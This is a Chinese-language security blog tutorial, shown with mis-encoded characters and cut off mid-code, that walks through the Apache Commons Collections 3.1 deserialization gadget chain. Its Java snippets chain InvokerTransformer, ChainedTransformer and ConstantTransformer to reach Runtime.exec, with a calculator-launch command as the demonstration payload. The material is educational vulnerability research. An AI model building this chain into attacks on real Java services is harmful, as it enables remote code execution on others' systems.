<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="mes9s0">
    
    <title>
        
            Javaå®‰å…¨ä»é›¶åˆ°ä¸€(8)-Commons Collections POP Gadget Chainsç®€ä»‹ |
        
        Mes9s0&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/biaoti.jpeg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/xiaoxin.jpeg","favicon":"/images/biaoti.jpeg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"åªæ˜¯å¸Œæœ›è¿›æ­¥è€Œå·²."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"};
  </script>
<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="CaiJiang's Blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                Mes9s0&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">Javaå®‰å…¨ä»é›¶åˆ°ä¸€(8)-Commons Collections POP Gadget Chainsç®€ä»‹</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/xiaoxin.jpeg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">mes9s0</span>
                        
                            <span class="author-label">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2023-02-18 10:48:53</span>
        <span class="mobile">2023-02-18 10:48</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/">Javaå®‰å…¨åŸºç¡€ç¯‡</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E5%BC%80%E5%8F%91/">å¼€å‘</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Java/">Java</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E5%AE%89%E5%85%A8/">å®‰å…¨</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/CC/">CC</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/POP-Gadget-Chains/">POP Gadget Chains</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>4.8k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>20 åˆ†é’Ÿ</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="å†™åœ¨ä¹‹å‰"><a href="#å†™åœ¨ä¹‹å‰" class="headerlink" title="å†™åœ¨ä¹‹å‰"></a>å†™åœ¨ä¹‹å‰</h2><p>â€‹    å…¶å®å¯¹äºåŸºç¡€ï¼ŒçœŸçš„å¤ªå¤šå¤ªå¤šäº†ï¼Œéœ€è¦å­¦ä¹ çš„ä¹Ÿå¾ˆå¤šï¼Œå¦‚æœçœŸçš„å¯ä»¥åšæŒå…¨éƒ¨åšä¸‹æ¥ï¼Œå…¶å®å¯¹Javaè¯­è¨€åŸºç¡€ç†è§£åº”è¯¥æ˜¯è¶³å¤Ÿçš„ã€‚è€Œæœ¬äººåœ¨å†™äº†å‰é¢çš„JavaåŸºç¡€çš„åšå®¢åï¼Œç¡®å®å¯¹ä»£ç çš„ç†è§£æ›´åŠ é€šé¡ºäº†ä¸€äº›ã€‚ä½†ç¡®å®è¿‡ç¨‹å¾ˆæ¼«é•¿ï¼Œå…‰ç¬¬äºŒç¯‡åŸºç¡€å°±å†™äº†5Wå¤šï¼ŒåŠ ä¸Šéœ€è¦å¯¹ä»£ç çš„ç†è§£ï¼Œæ‰€ä»¥å¯ä»¥æŠŠç¬¬äºŒç¯‡å½“ä½œçŸ¥è¯†åº“ï¼Œéœ€è¦çš„æ—¶å€™æŸ¥é˜…å³å¯ã€‚å½“ç„¶ï¼Œå…¨éƒ¨è¯»æ‡‚è‚¯å®šæ›´å¥½ã€‚æœ¬ç¯‡ä¼šä»CCé“¾ä¸­çš„TransformedMapå’ŒLazyMapä¸¤æ¡é“¾å­å…¥æ‰‹ï¼Œå¸Œæœ›æœ¬äººå¯ä»¥ææ‡‚ï¼Œå¦‚æœ‰ä¸æ­£ç¡®çš„ä¹Ÿæ¬¢è¿æŒ‡å‡ºğŸ™</p>
<h2 id="ç¯å¢ƒä¸æµç¨‹ç›¸å…³"><a href="#ç¯å¢ƒä¸æµç¨‹ç›¸å…³" class="headerlink" title="ç¯å¢ƒä¸æµç¨‹ç›¸å…³"></a>ç¯å¢ƒä¸æµç¨‹ç›¸å…³</h2><p>â€‹    å¤ç°ç¯å¢ƒæ˜¯ IntelliJ IDEA + jdk1.7.080 + Apache Commons Collections 3.1</p>
<ol>
<li><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ª Apache Commons Collections Â» 3.1 çš„ Jar åŒ… , å¯ä»¥ä»  MVNRepository ä¸Šè·å–åˆ°å®ƒ.</p>
</li>
<li><p>ç„¶åæ‰“å¼€ IntelliJ IDEA , åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ Java é¡¹ç›® , æ³¨æ„ JDK ç‰ˆæœ¬éœ€è¦ä¸º 1.7</p>
</li>
<li><p>å¯¼å…¥ä¹‹å‰ä¸‹è½½çš„ commons-collections-3.1.jar åŒ… ,</p>
</li>
</ol>
<h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><h3 id="org-apache-commons-collections-functors-InvokerTransformer-class"><a href="#org-apache-commons-collections-functors-InvokerTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer.class"></a><strong>org/apache/commons/collections/functors/InvokerTransformer.class</strong></h3><ol>
<li><strong>InvokerTransformer.class</strong> ç±»ä¸­çš„ <strong>Transformer()</strong> æ–¹æ³•ä¸­å­˜åœ¨ä¸€ç»„åå°„è°ƒç”¨ , è¿™ç»„åå°„è°ƒç”¨æ˜¯æ¼æ´äº§ç”Ÿçš„æ ¹æº.</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-071243.png"
                      alt="image-20230418151243061"
                ></p>
<p>â€‹    è¿™æ˜¯æˆ‘ä»¬ä»¥å‰çš„ä¾‹å­ï¼Œæˆ‘ä»¬æ‹¿å‡ºæ¥æ”¾åœ¨è¿™é‡Œå¯¹æ¯”</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span>(Process) exec.invoke(obj,<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-073821.png"
                      alt="image-20230418153820807"
                ></p>
<p>â€‹    å¯¹æ¯”ä¸€ä¸‹ , åªè¦æˆ‘ä»¬èƒ½æ§åˆ¶ <strong>input</strong> , <strong>this.iMethodName</strong> , <strong>this.iParamTypes</strong> , <strong>this.iArgs</strong> å››ä¸ªå‚æ•° , é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™ç»„åå°„è°ƒç”¨æ‰§è¡Œä»»æ„ä»£ç  !</p>
<ol start="2">
<li>é‚£ä¹ˆè¿™äº›å‚æ•°æ˜¯å¦å¯æ§å‘¢ ? å›é¡¾ <strong>InvokerTransformer.class</strong> ç±»çš„æ„é€ å‡½æ•° , å¯ä»¥å‘ç° <strong>this.iMethodName</strong> , <strong>this.iParamTypes</strong> , <strong>this.iArgs</strong> ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯ç›´æ¥å¯æ§çš„ , æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥å‚æ•°å€¼ , è€Œ <strong>input</strong> å‚æ•°æ˜¯ <strong>transform()</strong> å‡½æ•°è°ƒç”¨æ–¹ä¼ å…¥çš„ , åŒæ ·å¯æ§ .</li>
</ol>
<p>â€‹    ä¸‹å›¾ä¸ºInvokerTransformerçš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥å‘ç°iMethodName, iparamTypes, iArgsä¸‰ä¸ªå‚æ•°å‡ç›´æ¥å¯æ§.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-074636.png"
                      alt="image-20230418154636059"
                ></p>
<p>â€‹    è€Œinputå‚æ•°æ˜¯transform()å‚æ•°ä¼ å…¥çš„ï¼ŒåŒæ ·å¯ä»¥æ§åˆ¶</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-074853.png"
                      alt="image-20230418154853175"
                ></p>
<ol start="3">
<li>é‚£ä¹ˆåŸºäºè¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªæœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">transformeråˆ©ç”¨é“¾ï¼Œä»…æœ¬åœ°</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">easyPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;);</span><br><span class="line">        t1.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-075849.png"
                      alt="image-20230418155849410"
                ></p>
<ol start="3">
<li>è™½ç„¶å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ , ä½†æ˜¯è¿™ç§æ”»å‡»æ–¹å¼è‚¯å®šæ˜¯æ²¡æœ‰æ„ä¹‰çš„ , æˆ‘ä»¬æ„é€ ä»£ç æ˜¯ä¸ºäº†åœ¨è¿œç«¯æœåŠ¡ä¸Šæ‰§è¡Œ , è€Œå¹¶éåœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šæ‰§è¡Œ . è¿œç¨‹æœåŠ¡å™¨ä¸Šè‚¯å®šä¸ä¼šå‡ºç°åƒ <strong>t1.transform(Runtime.getRuntime());</strong> è¿™æ ·çš„ä»£ç  . æ‰€ä»¥æˆ‘ä»¬å¿…é¡»å¯¹ä¸Šè¿°ä»£ç åšä¼˜åŒ– , å‡å°‘ååºåˆ—åŒ–åçš„æ“ä½œ .</li>
</ol>
<p>â€‹    ä¼˜åŒ–ä»£ç çš„ç¬¬ä¸€æ­¥å°±æ˜¯æ¶ˆé™¤transform() æ–¹æ³•çš„å‚æ•°é™åˆ¶ : Runtime.getRuntime().</p>
<h3 id="org-apache-commons-collections-functors-ChainedTransformer-class"><a href="#org-apache-commons-collections-functors-ChainedTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer.class"></a><strong>org/apache/commons/collections/functors/ChainedTransformer.class</strong></h3><ol>
<li><p>æ¶ˆé™¤ä¸Šè¿°é™åˆ¶çš„æœ€å¥½æ–¹æ³•å°±æ˜¯é€šè¿‡ Java åå°„æœºåˆ¶æ¥æ„å»º <strong>java.lang.Runtime.getRuntime().exec()</strong> æ–¹æ³•è°ƒç”¨é“¾ . ç”±äº <strong>Runtime.class</strong> æ„é€ å‡½æ•°çš„ç‰¹æ®Šæ€§ , æˆ‘ä»¬åœ¨ç¼–å†™ Java åå°„ä»£ç æ—¶è‡³å°‘è¦è°ƒç”¨ <strong>getMethod()</strong> , <strong>getRuntime()</strong> , <strong>exec()</strong> , <strong>invoke()</strong> å››ä¸ªæ–¹æ³• . å› æ­¤ , ä¸€ç»„åå°„æ˜¯å®Œå…¨ä¸å¤Ÿç”¨çš„ , æˆ‘ä»¬å¿…é¡»è¦æ‰¾åˆ°ä¸€æ¡é“¾ , æ¥æ‹¼æ¥å¤šç»„åå°„ , ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ .</p>
<p>ChainedTransformer.transform() æ–¹æ³•æ°å¥½ç¬¦åˆè¿™ä¸ªè¦æ±‚.</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-081148.png"
                      alt="image-20230418161148153"
                ></p>
<p>â€‹    <strong>ChainedTransformer</strong> ç±»çš„æ„é€ å‡½æ•°è¿”å›ä¸€ä¸ª <strong>Transformer[]</strong> ç±»å‹çš„æ•°ç»„<strong>this.iTransformers</strong> . è¯¥ç±»çš„ <strong>transform()</strong> æ–¹æ³•ä¼šå¾ªç¯è·å– <strong>this.iTransformers</strong> æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹ , è°ƒç”¨å®ƒçš„ <strong>transform()</strong> æ–¹æ³• , å¹¶å°†è¿”å›ç»“æœä½œä¸ºä¸‹æ¬¡å¾ªç¯è°ƒç”¨çš„å‚æ•° .</p>
<p>â€‹    <strong>è¯·æ³¨æ„ï¼Œè¿™é‡Œçš„transform()æ–¹æ³•éå¸¸é‡è¦ï¼Œåç»­transformeråˆ©ç”¨é“¾åŸºæœ¬ä¸Šéƒ½å›´ç»•å®ƒå±•å¼€ï¼Œè¿™é‡Œçš„æ„æ€æ˜¯ï¼Œæ¯æ¬¡éƒ½ä»iTransformers[ ]æ•°ç»„ä¸­æ‹¿ä¸€ä¸ªï¼Œå‡å®šæ­¤å¤„ä¸ºiTransformers[1]ï¼Œæ‰§è¡Œtransform(a)ï¼Œtransformè¿”å›çš„æ˜¯ä¸€ä¸ªa.iTransformers[1]( )ï¼Œç„¶åç»§ç»­æ‹¿è¿™ä¸ªå¯¹è±¡å†å»ä»iTransformers[ ]æ•°ç»„ä¸­å–å‡ºç¬¬äºŒä¸ªï¼Œä»¥æ­¤å¾ªç¯</strong></p>
<p>â€‹    <strong>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¿™é‡Œæƒ³è¦çš„æ˜¯Runtime.getRuntime.exec( )</strong></p>
<p>â€‹    æ‰€ä»¥ , æˆ‘ä»¬å¯ä»¥ç¼–å†™å¤šä¸ª <strong>InvokerTransformer</strong> å®ä¾‹å¯¹è±¡ , åˆ†åˆ«è·å– <strong>getRuntime()</strong> , <strong>invoke()</strong> , <strong>exec()</strong> æ–¹æ³• , ç„¶åå°†è¿™äº›å®ä¾‹å¯¹è±¡æ·»åŠ åˆ° <strong>this.iTransformers</strong> æ•°ç»„ä¸­ , ä»è€Œè·å¾—ä¸€æ¡å®Œæ•´çš„è°ƒç”¨é“¾ .</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨getMethodæ–¹æ³•,ç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•, è¿”å›Runtime.getRuntime()æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    é‚£ä¹ˆå¦‚ä½•è·å– java.lang.Runtime å®ä¾‹å¯¹è±¡ , æ¥å¼€å¯è¿™ä¸ªè°ƒç”¨é“¾å‘¢ ?</p>
<h3 id="org-apache-commons-collections-functors-ConstantTransformer-class"><a href="#org-apache-commons-collections-functors-ConstantTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer.class"></a><strong>org/apache/commons/collections/functors/ConstantTransformer.class</strong></h3><ol>
<li>ç›®å‰çš„é—®é¢˜æ˜¯å¦‚ä½•è·å– <strong>Runtime</strong> å®ä¾‹å¯¹è±¡ . è€Œ <strong>ConstantTransformer.transform()</strong> æ–¹æ³•æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ .</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-091720.png"
                      alt="image-20230418171720036"
                ></p>
<p>â€‹    <strong>ConstantTransformer.transform()</strong> æ–¹æ³•æ°å¥½ä¼šè¿”å› <strong>Runtime()</strong> å®ä¾‹å¯¹è±¡ , å› æ­¤æˆ‘ä»¬åªéœ€è¦å°† <strong>Runtime.class</strong> ä¼ å…¥ <strong>ConstantTransformer</strong> çš„æ„é€ æ–¹æ³•ä¸­å³å¯ .</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//åå°„è°ƒç”¨getMethodæ–¹æ³•,ç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•, è¿”å›Runtime.getRuntime()æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>â€‹    è‡³æ­¤ , <strong>transform( )</strong> æ–¹æ³•çš„å‚æ•°é™åˆ¶å·²ç»è¢«å»é™¤ , æ­¤æ—¶æ— è®º <strong>transform( )</strong> æ–¹æ³•çš„å‚æ•°æ˜¯ä»€ä¹ˆ , éƒ½ä¼šæ‰§è¡Œ <strong>java.lang.Runtime.getRuntime( ).exec( )</strong> è°ƒç”¨é“¾ , å®ç°å‘½ä»¤æ‰§è¡Œ.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span 